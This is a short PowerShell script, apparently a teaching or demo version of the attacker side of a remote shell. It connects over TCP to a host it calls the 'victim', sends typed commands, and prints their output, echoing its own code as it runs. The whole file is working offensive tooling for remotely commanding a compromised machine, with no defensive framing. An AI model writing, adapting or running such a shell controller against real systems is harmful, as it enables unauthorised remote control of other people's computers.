$port = 1234
$user=$env:USERNAME
$ip="127.0.0.1"

$client = New-Object System.Net.Sockets.TcpClient ($ip, $port)
Write-Host "`$client = New-Object System.Net.Sockets.TcpClient ($ip, $port)"
Write-Host "[*] Connected to victim"

$stream = $client.GetStream()
Write-Host "`$stream = $client.GetStream()"
Write-Host "[*] Got Stream"

Write-Host "[*] Creating stream reader..."
Write-Host "`$reader = New-Object System.IO.StreamReader($stream) "
$reader = New-Object System.IO.StreamReader($stream)                              #Create a stream reader

Write-Host "[*] Creating stream writer..."
Write-Host "`$writer = New-Object System.IO.StreamWriter($stream)"
$writer = New-Object System.IO.StreamWriter($stream)                              #Create a stream writer

while ($client.Connected){
   
    Write-Host "[$ip]> " -NoNewline
    Write-Host "`$cmd = Read-Host" 
    $cmd = Read-Host 

    if ($cmd -match "exit"){
        $client.Dispose()
        $stream.Dispose()
        $writer.Dispose()
        $reader.Dispose()
        break
    }

    Write-Host "[*] Sending command: $cmd"
    Write-Host "$writer.Write("$cmd")"
    $writer.Write("$cmd")

    #$stream.Flush()
    #Write-Host "[*] Flushed writer"

    Write-Host "[*] Reading command output..."
    Write-Host "`$cmdOutput=$reader.ReadLine()"
    while (($cmdOutput=$reader.ReadLine()).Length -gt 0){
        Write-Host "$cmdOutput"
        Start-Sleep -Milliseconds 500
    }
}
$client.Dispose()
$stream.Dispose()
$writer.Dispose()
$reader.Dispose()